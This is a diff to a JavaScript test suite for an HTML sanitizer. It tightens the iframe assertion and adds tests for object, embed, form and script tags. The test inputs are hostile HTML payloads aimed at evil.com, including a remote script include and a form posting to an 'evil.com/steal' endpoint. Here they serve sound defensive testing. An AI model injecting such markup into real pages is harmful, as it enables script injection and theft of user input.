@@ -23,10 +23,28 @@ describe('sanitizeHTML', () => {
     expect(result).not.toContain('onerror')
   })
 
+  // Assert on the tag NAME, not on a literal '<iframe>'. Every real payload
+  // carries attributes, so an exact-tag assertion passes on unsanitized input and
+  // the case can only fail for a bare tag nobody sends.
   it('forbids iframes', () => {
     const input = '<iframe src="https://evil.com"></iframe><p>content</p>'
     const result = sanitizeHTML(input)
-    expect(result).not.toContain('<iframe>')
+    expect(result).not.toMatch(/<iframe/i)
+    expect(result).not.toContain('evil.com')
+    expect(result).toContain('<p>content</p>')
+  })
+
+  // The remaining forbidden tags carry attributes too, and none of them was
+  // covered at all, so the same regression would have gone equally unnoticed.
+  it.each([
+    ['object', '<object data="https://evil.com/x.swf"></object>'],
+    ['embed', '<embed src="https://evil.com/x.swf">'],
+    ['form', '<form action="https://evil.com/steal"><input name="p"></form>'],
+    ['script', '<script src="https://evil.com/x.js"></script>'],
+  ])('forbids %s even with attributes', (tag, payload) => {
+    const result = sanitizeHTML(payload + '<p>content</p>')
+    expect(result).not.toMatch(new RegExp('<' + tag, 'i'))
+    expect(result).not.toContain('evil.com')
     expect(result).toContain('<p>content</p>')
   })
 
